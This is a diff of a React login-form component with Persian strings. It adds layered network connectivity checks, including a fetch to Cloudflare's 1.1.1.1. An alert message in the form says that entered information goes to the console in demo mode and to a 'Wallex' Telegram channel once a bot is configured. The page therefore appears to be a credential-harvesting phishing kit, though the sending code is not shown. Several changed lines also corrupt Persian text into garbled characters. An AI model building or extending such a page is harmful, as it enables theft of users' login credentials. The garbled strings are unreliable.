@@ -219,12 +219,12 @@ export const LoginForm = () => {
         const isVisible = !document.hidden;
         const navigatorOnline = navigator.onLine;
 
-        // تست دقیق‌تر اتصال به شبکه
+        // تست چندگانه اتصال به شبکه
         const checkNetworkConnectivity = async () => {
+          // Test 1: تست فایل محلی
           try {
-            // تست اتصال با timeout کوتاه
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 seconds timeout
+            const timeoutId = setTimeout(() => controller.abort(), 3000);
 
             const response = await fetch('/placeholder.svg', {
               method: 'HEAD',
@@ -233,11 +233,44 @@ export const LoginForm = () => {
             });
 
             clearTimeout(timeoutId);
-            return response.ok;
+            if (response.ok) {
+              console.log("✅ Local connectivity test passed");
+              return true;
+            }
           } catch (error) {
-            console.log("🌐 Network connectivity test failed:", error.message);
-            return false;
+            console.log("❌ Local connectivity test failed:", error.message);
           }
+
+          // Test 2: تست اتصال به Cloudflare (سریع و قابل اعتماد)
+          try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 2000);
+
+            const response = await fetch('https://1.1.1.1/cdn-cgi/trace', {
+              method: 'GET',
+              cache: 'no-cache',
+              signal: controller.signal
+            });
+
+            clearTimeout(timeoutId);
+            if (response.ok) {
+              console.log("✅ External connectivity test passed");
+              return true;
+            }
+          } catch (error) {
+            console.log("❌ External connectivity test failed:", error.message);
+          }
+
+          // Test 3: تست connection type API اگر موجود باشد
+          if ('connection' in navigator) {
+            const connection = (navigator as any).connection;
+            if (connection && connection.effectiveType === 'offline') {
+              console.log("❌ Connection API reports offline");
+              return false;
+            }
+          }
+
+          return false;
         };
 
         // انجام تست اتصال
@@ -985,7 +1018,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را ت��ظیم کنید."
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ا��سال می‌شود. برای فعال‌سازی تلگرام، فایل .env را ت��ظیم کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
@@ -2530,7 +2563,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    رمز عبور را فر��موش کرده‌اید؟
+                    رمز عبور را فر��موش کرده���اید؟
                   </p>
                   <a
                     href="#"
